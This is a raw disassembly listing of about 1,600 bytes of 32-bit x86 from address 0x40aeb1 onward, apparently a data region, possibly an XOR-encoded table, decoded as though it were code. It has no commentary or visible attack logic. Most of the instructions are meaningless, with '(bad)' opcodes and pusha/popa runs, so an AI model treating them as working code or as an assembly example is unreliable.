  40aeb1:	ed                   	in     (%dx),%eax
  40aeb2:	8f                   	(bad)
  40aeb3:	62 cd a0             	(bad) {rn-bad},{%k5}
  40aeb6:	15 a0 a0 c8 15       	adc    $0x15c8a0a0,%eax
  40aebb:	a0 a0 f0 15 a0       	mov    0xa015f0a0,%al
  40aec0:	a0 18 15 a0 a0       	mov    0xa0a01518,%al
  40aec5:	40                   	inc    %eax
  40aec6:	15 a0 a0 6c 40       	adc    $0x406ca0a0,%eax
  40aecb:	a0 a0 60 a0 60       	mov    0x60a060a0,%al
  40aed0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aed5:	60                   	pusha
  40aed6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aedb:	60                   	pusha
  40aedc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aee1:	60                   	pusha
  40aee2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aee7:	60                   	pusha
  40aee8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aeed:	60                   	pusha
  40aeee:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aef3:	60                   	pusha
  40aef4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aef9:	60                   	pusha
  40aefa:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aeff:	60                   	pusha
  40af00:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af05:	60                   	pusha
  40af06:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af0b:	60                   	pusha
  40af0c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af11:	60                   	pusha
  40af12:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af17:	60                   	pusha
  40af18:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af1d:	60                   	pusha
  40af1e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af23:	60                   	pusha
  40af24:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af29:	60                   	pusha
  40af2a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af2f:	60                   	pusha
  40af30:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af35:	60                   	pusha
  40af36:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af3b:	60                   	pusha
  40af3c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af41:	60                   	pusha
  40af42:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af47:	60                   	pusha
  40af48:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af4d:	60                   	pusha
  40af4e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af53:	60                   	pusha
  40af54:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af59:	60                   	pusha
  40af5a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af5f:	60                   	pusha
  40af60:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af65:	60                   	pusha
  40af66:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af6b:	60                   	pusha
  40af6c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af71:	60                   	pusha
  40af72:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af77:	60                   	pusha
  40af78:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af7d:	60                   	pusha
  40af7e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af83:	60                   	pusha
  40af84:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af89:	60                   	pusha
  40af8a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af8f:	60                   	pusha
  40af90:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af95:	60                   	pusha
  40af96:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40af9b:	60                   	pusha
  40af9c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afa1:	60                   	pusha
  40afa2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afa7:	60                   	pusha
  40afa8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afad:	60                   	pusha
  40afae:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afb3:	60                   	pusha
  40afb4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afb9:	60                   	pusha
  40afba:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afbf:	60                   	pusha
  40afc0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afc5:	60                   	pusha
  40afc6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afcb:	60                   	pusha
  40afcc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afd1:	60                   	pusha
  40afd2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afd7:	60                   	pusha
  40afd8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afdd:	60                   	pusha
  40afde:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afe3:	60                   	pusha
  40afe4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afe9:	60                   	pusha
  40afea:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40afef:	60                   	pusha
  40aff0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40aff5:	60                   	pusha
  40aff6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40affb:	60                   	pusha
  40affc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b001:	60                   	pusha
  40b002:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b007:	60                   	pusha
  40b008:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b00d:	60                   	pusha
  40b00e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b013:	60                   	pusha
  40b014:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b019:	60                   	pusha
  40b01a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b01f:	60                   	pusha
  40b020:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b025:	60                   	pusha
  40b026:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b02b:	60                   	pusha
  40b02c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b031:	60                   	pusha
  40b032:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b037:	60                   	pusha
  40b038:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b03d:	60                   	pusha
  40b03e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b043:	60                   	pusha
  40b044:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b049:	60                   	pusha
  40b04a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b04f:	60                   	pusha
  40b050:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b055:	60                   	pusha
  40b056:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b05b:	60                   	pusha
  40b05c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b061:	60                   	pusha
  40b062:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b067:	60                   	pusha
  40b068:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b06d:	60                   	pusha
  40b06e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b073:	60                   	pusha
  40b074:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b079:	60                   	pusha
  40b07a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b07f:	60                   	pusha
  40b080:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b085:	60                   	pusha
  40b086:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b08b:	60                   	pusha
  40b08c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b091:	60                   	pusha
  40b092:	a0 60 a0 54 d1       	mov    0xd154a060,%al
  40b097:	61                   	popa
  40b098:	a0 14 d0 61 a0       	mov    0xa061d014,%al
  40b09d:	60                   	pusha
  40b09e:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0a3:	60                   	pusha
  40b0a4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0a9:	44                   	inc    %esp
  40b0aa:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b0ad:	94                   	xchg   %eax,%esp
  40b0ae:	d1 61 a0             	shll   $1,-0x60(%ecx)
  40b0b1:	60                   	pusha
  40b0b2:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0b7:	60                   	pusha
  40b0b8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0bd:	5c                   	pop    %esp
  40b0be:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b0c1:	9c                   	pushf
  40b0c2:	d1 61 a0             	shll   $1,-0x60(%ecx)
  40b0c5:	60                   	pusha
  40b0c6:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0cb:	60                   	pusha
  40b0cc:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0d1:	90                   	nop
  40b0d2:	d4 61                	aam    $0x61
  40b0d4:	a0 a8 d1 61 a0       	mov    0xa061d1a8,%al
  40b0d9:	60                   	pusha
  40b0da:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0df:	60                   	pusha
  40b0e0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0e5:	2a d4                	sub    %ah,%dl
  40b0e7:	61                   	popa
  40b0e8:	a0 cc d1 61 a0       	mov    0xa061d1cc,%al
  40b0ed:	60                   	pusha
  40b0ee:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0f3:	60                   	pusha
  40b0f4:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b0f9:	ee                   	out    %al,(%dx)
  40b0fa:	d6                   	salc
  40b0fb:	61                   	popa
  40b0fc:	a0 2c d1 61 a0       	mov    0xa061d12c,%al
  40b101:	60                   	pusha
  40b102:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b107:	60                   	pusha
  40b108:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b10d:	0a d6                	or     %dh,%dl
  40b10f:	61                   	popa
  40b110:	a0 34 d1 61 a0       	mov    0xa061d134,%al
  40b115:	60                   	pusha
  40b116:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b11b:	60                   	pusha
  40b11c:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b121:	34 d6                	xor    $0xd6,%al
  40b123:	61                   	popa
  40b124:	a0 40 d1 61 a0       	mov    0xa061d140,%al
  40b129:	60                   	pusha
  40b12a:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b12f:	60                   	pusha
  40b130:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b135:	60                   	pusha
  40b136:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b13b:	60                   	pusha
  40b13c:	a0 62 d2 61 a0       	mov    0xa061d262,%al
  40b141:	78 d2                	js     0x40b115
  40b143:	61                   	popa
  40b144:	a0 8c d2 61 a0       	mov    0xa061d28c,%al
  40b149:	9c                   	pushf
  40b14a:	d2 61 a0             	shlb   %cl,-0x60(%ecx)
  40b14d:	b0 d2                	mov    $0xd2,%al
  40b14f:	61                   	popa
  40b150:	a0 be d2 61 a0       	mov    0xa061d2be,%al
  40b155:	ca d2 61             	lret   $0x61d2
  40b158:	a0 e6 d2 61 a0       	mov    0xa061d2e6,%al
  40b15d:	f8                   	clc
  40b15e:	d2 61 a0             	shlb   %cl,-0x60(%ecx)
  40b161:	08 d2                	or     %dl,%dl
  40b163:	61                   	popa
  40b164:	a0 14 d2 61 a0       	mov    0xa061d214,%al
  40b169:	20 d2                	and    %dl,%dl
  40b16b:	61                   	popa
  40b16c:	a0 32 d2 61 a0       	mov    0xa061d232,%al
  40b171:	42                   	inc    %edx
  40b172:	d2 61 a0             	shlb   %cl,-0x60(%ecx)
  40b175:	50                   	push   %eax
  40b176:	d2 61 a0             	shlb   %cl,-0x60(%ecx)
  40b179:	60                   	pusha
  40b17a:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b17d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b17e:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b181:	7c d3                	jl     0x40b156
  40b183:	61                   	popa
  40b184:	a0 8a d3 61 a0       	mov    0xa061d38a,%al
  40b189:	9c                   	pushf
  40b18a:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b18d:	aa                   	stos   %al,%es:(%edi)
  40b18e:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b191:	b8 d3 61 a0 c2       	mov    $0xc2a061d3,%eax
  40b196:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b199:	ce                   	into
  40b19a:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b19d:	da d3                	fcmovbe %st(3),%st
  40b19f:	61                   	popa
  40b1a0:	a0 e8 d3 61 a0       	mov    0xa061d3e8,%al
  40b1a5:	fe                   	(bad)
  40b1a6:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b1a9:	0c d3                	or     $0xd3,%al
  40b1ab:	61                   	popa
  40b1ac:	a0 18 d3 61 a0       	mov    0xa061d318,%al
  40b1b1:	26 d3 61 a0          	shll   %cl,%es:-0x60(%ecx)
  40b1b5:	32 d3                	xor    %bl,%dl
  40b1b7:	61                   	popa
  40b1b8:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b1bd:	50                   	push   %eax
  40b1be:	d3 61 a0             	shll   %cl,-0x60(%ecx)
  40b1c1:	60                   	pusha
  40b1c2:	a0 60 a0 6a d4       	mov    0xd46aa060,%al
  40b1c7:	61                   	popa
  40b1c8:	a0 7a d4 61 a0       	mov    0xa061d47a,%al
  40b1cd:	60                   	pusha
  40b1ce:	a0 60 a0 9e d4       	mov    0xd49ea060,%al
  40b1d3:	61                   	popa
  40b1d4:	a0 ae d4 61 a0       	mov    0xa061d4ae,%al
  40b1d9:	bc d4 61 a0 ce       	mov    $0xcea061d4,%esp
  40b1de:	d4 61                	aam    $0x61
  40b1e0:	a0 e2 d4 61 a0       	mov    0xa061d4e2,%al
  40b1e5:	f8                   	clc
  40b1e6:	d4 61                	aam    $0x61
  40b1e8:	a0 02 d4 61 a0       	mov    0xa061d402,%al
  40b1ed:	0e                   	push   %cs
  40b1ee:	d4 61                	aam    $0x61
  40b1f0:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b1f5:	38 d4                	cmp    %dl,%ah
  40b1f7:	61                   	popa
  40b1f8:	a0 4e d4 61 a0       	mov    0xa061d44e,%al
  40b1fd:	62 d5 61             	(bad) {bad}
  40b200:	a0 6a d5 61 a0       	mov    0xa061d56a,%al
  40b205:	7a d5                	jp     0x40b1dc
  40b207:	61                   	popa
  40b208:	a0 92 d5 61 a0       	mov    0xa061d592,%al
  40b20d:	a2 d5 61 a0 b8       	mov    %al,0xb8a061d5
  40b212:	d5 61                	aad    $0x61
  40b214:	a0 d2 d5 61 a0       	mov    0xa061d5d2,%al
  40b219:	e2 d5                	loop   0x40b1f0
  40b21b:	61                   	popa
  40b21c:	a0 f8 d5 61 a0       	mov    0xa061d5f8,%al
  40b221:	0e                   	push   %cs
  40b222:	d5 61                	aad    $0x61
  40b224:	a0 28 d5 61 a0       	mov    0xa061d528,%al
  40b229:	3c d5                	cmp    $0xd5,%al
  40b22b:	61                   	popa
  40b22c:	a0 50 d5 61 a0       	mov    0xa061d550,%al
  40b231:	60                   	pusha
  40b232:	d6                   	salc
  40b233:	61                   	popa
  40b234:	a0 72 d6 61 a0       	mov    0xa061d672,%al
  40b239:	7e d6                	jle    0x40b211
  40b23b:	61                   	popa
  40b23c:	a0 98 d6 61 a0       	mov    0xa061d698,%al
  40b241:	b0 d6                	mov    $0xd6,%al
  40b243:	61                   	popa
  40b244:	a0 be d6 61 a0       	mov    0xa061d6be,%al
  40b249:	d0 d6                	rcl    $1,%dh
  40b24b:	61                   	popa
  40b24c:	a0 e0 d6 61 a0       	mov    0xa061d6e0,%al
  40b251:	60                   	pusha
  40b252:	a0 60 a0 fa d6       	mov    0xd6faa060,%al
  40b257:	61                   	popa
  40b258:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b25d:	16                   	push   %ss
  40b25e:	d6                   	salc
  40b25f:	61                   	popa
  40b260:	a0 24 d6 61 a0       	mov    0xa061d624,%al
  40b265:	60                   	pusha
  40b266:	a0 60 a0 40 d6       	mov    0xd640a060,%al
  40b26b:	61                   	popa
  40b26c:	a0 54 d6 61 a0       	mov    0xa061d654,%al
  40b271:	68 d7 61 a0 78       	push   $0x78a061d7
  40b276:	d7                   	xlat   %ds:(%ebx)
  40b277:	61                   	popa
  40b278:	a0 60 a0 60 a0       	mov    0xa060a060,%al
  40b27d:	cb                   	lret
  40b27e:	05 d2 0e c5 0c       	add    $0xcc50ed2,%eax
  40b283:	93                   	xchg   %eax,%ebx
  40b284:	d2 8e 04 cc 0c 60    	rorb   %cl,0x600ccc04(%esi)
  40b28a:	a0 60 a0 a7 05       	mov    0x5a7a060,%al
  40b28f:	d4 e3                	aam    $0xe3
  40b291:	d5 12                	aad    $0x12
  40b293:	d2 05 ce 14 b4 08    	rolb   %cl,0x8b414ce
  40b299:	d2 05 c1 04 a9 04    	rolb   %cl,0x4a904c1
  40b29f:	60                   	pusha
  40b2a0:	a0 60 a0 b2 05       	mov    0x5b2a060,%al
  40b2a5:	cd 0f                	int    $0xf
  40b2a7:	d6                   	salc
  40b2a8:	05 a4 09 d2 05       	add    $0x5d209a4,%eax
  40b2ad:	c3                   	ret
  40b2ae:	14 cf                	adc    $0xcf,%al
  40b2b0:	12 d9                	adc    %cl,%bl
  40b2b2:	e1 60                	loope  0x40b314
  40b2b4:	a0 60 a0 a7 05       	mov    0x5a7a060,%al
  40b2b9:	d4 ec                	aam    $0xec
  40b2bb:	c1 13 d4             	rcll   $0xd4,(%ebx)
  40b2be:	e5 d2                	in     $0xd2,%eax
  40b2c0:	12 cf                	adc    %bh,%cl
  40b2c2:	12 60 a0             	adc    -0x60(%eax),%ah
  40b2c5:	60                   	pusha
  40b2c6:	a0 a3 12 c5 01       	mov    0x1c512a3,%al
  40b2cb:	d4 05                	aam    $0x5
  40b2cd:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b2ce:	09 d2                	or     %edx,%edx
  40b2d0:	05 c3 14 cf 12       	add    $0x12cf14c3,%eax
  40b2d5:	d9 e1                	fabs
  40b2d7:	60                   	pusha
  40b2d8:	a0 60 a0 a5 18       	mov    0x18a5a060,%al
  40b2dd:	c9                   	leave
  40b2de:	14 b0                	adc    $0xb0,%al
  40b2e0:	12 cf                	adc    %bh,%cl
  40b2e2:	03 c5                	add    %ebp,%eax
  40b2e4:	13 d3                	adc    %ebx,%edx
  40b2e6:	a0 60 a0 b7 12       	mov    0x12b7a060,%al
  40b2eb:	c9                   	leave
  40b2ec:	14 c5                	adc    $0xc5,%al
  40b2ee:	e6 c9                	out    %al,$0xc9
  40b2f0:	0c c5                	or     $0xc5,%al
  40b2f2:	a0 60 a0 b5 0e       	mov    0xeb5a060,%al
  40b2f7:	c8 01 ce 04          	enter  $0xce01,$0x4
  40b2fb:	cc                   	int3
  40b2fc:	05 c4 e5 d8 03       	add    $0x3d8e5c4,%eax
  40b301:	c5 10                	lds    (%eax),%edx
  40b303:	d4 09                	aam    $0x9
  40b305:	cf                   	iret
  40b306:	0e                   	push   %cs
  40b307:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b308:	09 cc                	or     %ecx,%esp
  40b30a:	14 c5                	adc    $0xc5,%al
  40b30c:	12 60 a0             	adc    -0x60(%eax),%ah
  40b30f:	60                   	pusha
  40b310:	a0 b3 05 d4 e6       	mov    0xe6d405b3,%al
  40b315:	c9                   	leave
  40b316:	0c c5                	or     $0xc5,%al
  40b318:	f0 cf                	lock iret
  40b31a:	09 ce                	or     %ecx,%esi
  40b31c:	14 c5                	adc    $0xc5,%al
  40b31e:	12 60 a0             	adc    -0x60(%eax),%ah
  40b321:	60                   	pusha
  40b322:	a0 b3 05 d4 e5       	mov    0xe5d405b3,%al
  40b327:	ce                   	into
  40b328:	04 af                	add    $0xaf,%al
  40b32a:	06                   	push   %es
  40b32b:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b32c:	09 cc                	or     %ecx,%esp
  40b32e:	05 60 a0 60 a0       	add    $0xa060a060,%eax
  40b333:	b2 14                	mov    $0x14,%dl
  40b335:	cc                   	int3
  40b336:	f5                   	cmc
  40b337:	ce                   	into
  40b338:	17                   	pop    %ss
  40b339:	c9                   	leave
  40b33a:	0e                   	push   %cs
  40b33b:	c4 a0 60 a0 b2 05    	les    0x5b2a060(%eax),%esp
  40b341:	c1 04 a6 09          	roll   $0x9,(%esi,%eiz,4)
  40b345:	cc                   	int3
  40b346:	05 60 a0 60 a0       	add    $0xa060a060,%eax
  40b34b:	b2 01                	mov    $0x1,%dl
  40b34d:	c9                   	leave
  40b34e:	13 c5                	adc    %ebp,%eax
  40b350:	e5 d8                	in     $0xd8,%eax
  40b352:	03 c5                	add    %ebp,%eax
  40b354:	10 d4                	adc    %dl,%ah
  40b356:	09 cf                	or     %ecx,%edi
  40b358:	0e                   	push   %cs
  40b359:	60                   	pusha
  40b35a:	a0 60 a0 a7 05       	mov    0x5a7a060,%al
  40b35f:	d4 f3                	aam    $0xf3
  40b361:	d4 04                	aam    $0x4
  40b363:	a8 01                	test   $0x1,%al
  40b365:	ce                   	into
  40b366:	04 cc                	add    $0xcc,%al
  40b368:	05 60 a0 60 a0       	add    $0xa060a060,%eax
  40b36d:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40b36e:	05 d4 e6 c9 0c       	add    $0xcc9e6d4,%eax
  40b373:	c5 f3 c9             	(bad)
  40b376:	1a c5                	sbb    %ch,%al
  40b378:	a0 60 a0 a7 05       	mov    0x5a7a060,%al
  40b37d:	d4 f3                	aam    $0xf3
  40b37f:	d9 13                	fsts   (%ebx)
  40b381:	d4 05                	aam    $0x5
  40b383:	cd f4                	int    $0xf4
  40b385:	c9                   	leave
  40b386:	0d c5 a0 60 a0       	or     $0xa060a0c5,%eax
  40b38b:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40b38c:	05 d4 e6 c9 0c       	add    $0xcc9e6d4,%eax
  40b391:	c5 f4 d9             	(bad)
  40b394:	10 c5                	adc    %al,%ch
  40b396:	a0 60 a0 a3 12       	mov    0x12a3a060,%al
  40b39b:	c5 01                	lds    (%ecx),%eax
  40b39d:	d4 05                	aam    $0x5
  40b39f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40b3a0:	09 cc                	or     %ecx,%esp
  40b3a2:	05 a1 a0 60 a0       	add    $0xa060a0a1,%eax
  40b3a7:	a3 0c cf 13 c5       	mov    %eax,0xc513cf0c
  40b3ac:	e8 c1 0e c4 0c       	call   0xd04c272
  40b3b1:	c5 a0 60 a0 a7 05    	lds    0x5a7a060(%eax),%esp
  40b3b7:	d4 e3                	aam    $0xe3
  40b3b9:	cf                   	iret
  40b3ba:	0d cd 01 ce 04       	or     $0x4ce01cd,%eax
  40b3bf:	ac                   	lods   %ds:(%esi),%al
  40b3c0:	09 ce                	or     %ecx,%esi
  40b3c2:	05 a1 a0 60 a0       	add    $0xa060a0a1,%eax
  40b3c7:	b4 0c                	mov    $0xc,%ah
  40b3c9:	d3 f3                	shl    %cl,%ebx
  40b3cb:	c5 14 b6             	lds    (%esi,%esi,4),%edx
  40b3ce:	01 cc                	add    %ecx,%esp
  40b3d0:	15 c5 a0 60 a0       	adc    $0xa060a0c5,%eax
  40b3d5:	b4 0c                	mov    $0xc,%ah
  40b3d7:	d3 e7                	shl    %cl,%edi
  40b3d9:	c5 14 b6             	lds    (%esi,%esi,4),%edx
  40b3dc:	01 cc                	add    %ecx,%esp
  40b3de:	15 c5 a0 60 a0       	adc    $0xa060a0c5,%eax
  40b3e3:	b4 0c                	mov    $0xc,%ah
  40b3e5:	d3 e6                	shl    %cl,%esi
  40b3e7:	d2 05 c5 a0 60 a0    	rolb   %cl,0xa060a0c5
  40b3ed:	b4 0c                	mov    $0xc,%ah
  40b3ef:	d3 e1                	shl    %cl,%ecx
  40b3f1:	cc                   	int3
  40b3f2:	0c cf                	or     $0xcf,%al
  40b3f4:	03 60 a0             	add    -0x60(%eax),%esp
  40b3f7:	60                   	pusha
  40b3f8:	a0 ac 0f c3 01       	mov    0x1c30fac,%al
  40b3fd:	cc                   	int3
  40b3fe:	e6 d2                	out    %al,$0xd2
  40b400:	05 c5 a0 60 a0       	add    $0xa060a0c5,%eax
  40b405:	ac                   	lods   %ds:(%esi),%al
  40b406:	0f c3 01             	movnti %eax,(%ecx)
  40b409:	cc                   	int3
  40b40a:	e1 cc                	loope  0x40b3d8
  40b40c:	0c cf                	or     $0xcf,%al
  40b40e:	03 60 a0             	add    -0x60(%eax),%esp
  40b411:	60                   	pusha
  40b412:	a0 a7 05 d4 ed       	mov    0xedd405a7,%al
  40b417:	cf                   	iret
  40b418:	04 d5                	add    $0xd5,%al
  40b41a:	0c c5                	or     $0xc5,%al
  40b41c:	e6 c9                	out    %al,$0xc9
  40b41e:	0c c5                	or     $0xc5,%al
  40b420:	ee                   	out    %al,(%dx)
  40b421:	c1 0d c5 e1 60 a0 60 	rorl   $0x60,0xa060e1c5
  40b428:	a0 a6 12 c5 05       	mov    0x5c512a6,%al
  40b42d:	ac                   	lods   %ds:(%esi),%al
  40b42e:	09 c2                	or     %eax,%edx
  40b430:	12 c1                	adc    %cl,%al
  40b432:	12 d9                	adc    %cl,%bl
  40b434:	a0 60 a0 a8 05       	mov    0x5a8a060,%al
  40b439:	c1 10 a6             	rcll   $0xa6,(%eax)
  40b43c:	12 c5                	adc    %ch,%al
  40b43e:	05 60 a0 60 a0       	add    $0xa060a060,%eax
  40b443:	a8 05                	test   $0x5,%al
  40b445:	c1 10 b2             	rcll   $0xb2,(%eax)
  40b448:	05 a1 0c cc 0f       	add    $0xfcc0ca1,%eax
  40b44d:	c3                   	ret
  40b44e:	a0 60 a0 a8 05       	mov    0x5a8a060,%al
  40b453:	c1 10 a1             	rcll   $0xa1,(%eax)
  40b456:	0c cc                	or     $0xcc,%al
  40b458:	0f c3 a0 60 a0 a7 05 	movnti %esp,0x5a7a060(%eax)
  40b45f:	d4 f0                	aam    $0xf0
  40b461:	d2 0f                	rorb   %cl,(%edi)
  40b463:	c3                   	ret
  40b464:	05 d3 13 a8 05       	add    $0x5a813d3,%eax
  40b469:	c1 10 60             	rcll   $0x60,(%eax)
  40b46c:	a0 d5 13 c5 12       	mov    0x12c513d5,%al
  40b471:	93                   	xchg   %eax,%ebx
  40b472:	d2 8e 04 cc 0c 60    	rorb   %cl,0x600ccc04(%esi)
  40b478:	a0 60 a0 a3 08       	mov    0x8a3a060,%al
  40b47d:	c1 12 ae             	rcll   $0xae,(%edx)
  40b480:	05 d8 14 a1 a0       	add    $0xa0a114d8,%eax
  40b485:	cf                   	iret
  40b486:	0c c5                	or     $0xc5,%al
  40b488:	01 d5                	add    %edx,%ebp
  40b48a:	14 93                	adc    $0x93,%al
  40b48c:	d2 8e 04 cc 0c 60    	rorb   %cl,0x600ccc04(%esi)
  40b492:	a0 60 a0 b3 19       	mov    0x19b3a060,%al
  40b497:	d3 e6                	shl    %cl,%esi
  40b499:	d2 05 c5 f3 d4 12    	rolb   %cl,0x12d4f3c5
  40b49f:	c9                   	leave
  40b4a0:	0e                   	push   %cs
  40b4a1:	c7                   	(bad)
  40b4a2:	a0 60 a0 b3 19       	mov    0x19b3a060,%al
  40b4a7:	d3 f2                	shl    %cl,%edx
  40b4a9:	c5 e1 cc             	(bad)
  40b4ac:	0c cf                	or     $0xcf,%al
  40b4ae:	03 b3 14 d2 09 ce    	add    -0x31f62dec(%ebx),%esi
  40b4b4:	07                   	pop    %es
  40b4b5:	ac                   	lods   %ds:(%esi),%al
  40b4b6:	05 ce a0 c1 04       	add    $0x4c1a0ce,%eax
  40b4bb:	d6                   	salc
  40b4bc:	01 d0                	add    %edx,%eax
  40b4be:	09 93 d2 8e 04 cc    	or     %edx,-0x33fb712e(%ebx)
  40b4c4:	0c 60                	or     $0x60,%al
  40b4c6:	a0 60 a0 b2 05       	mov    0x5b2a060,%al
  40b4cb:	c7                   	(bad)
  40b4cc:	ef                   	out    %eax,(%dx)
  40b4cd:	d0 05 ce eb c5 19    	rolb   $1,0x19c5ebce
  40b4d3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b4d4:	18 a1 a0 60 a0 b2    	sbb    %ah,-0x4d5f9f60(%ecx)
  40b4da:	05 c7 e3 cc 0f       	add    $0xfcce3c7,%eax
  40b4df:	d3 05 ab 05 d9 a0    	roll   %cl,0xa0d905ab
  40b4e5:	60                   	pusha
  40b4e6:	a0 af 10 c5 0e       	mov    0xec510af,%al
  40b4eb:	b4 08                	mov    $0x8,%ah
  40b4ed:	d2 05 c1 04 b4 0f    	rolb   %cl,0xfb404c1
  40b4f3:	cb                   	lret
  40b4f4:	05 ce a0 60 a0       	add    $0xa060a0ce,%eax
  40b4f9:	af                   	scas   %es:(%edi),%eax
  40b4fa:	10 c5                	adc    %al,%ch
  40b4fc:	0e                   	push   %cs
  40b4fd:	b0 12                	mov    $0x12,%al
  40b4ff:	cf                   	iret
  40b500:	03 c5                	add    %ebp,%eax
  40b502:	13 d3                	adc    %ebx,%edx
  40b504:	f4                   	hlt
  40b505:	cf                   	iret
  40b506:	0b c5                	or     %ebp,%eax
  40b508:	0e                   	push   %cs
  40b509:	60                   	pusha
  40b50a:	a0 60 a0 a7 05       	mov    0x5a7a060,%al
  40b50f:	d4 f4                	aam    $0xf4
  40b511:	cf                   	iret
  40b512:	0b c5                	or     %ebp,%eax
  40b514:	0e                   	push   %cs
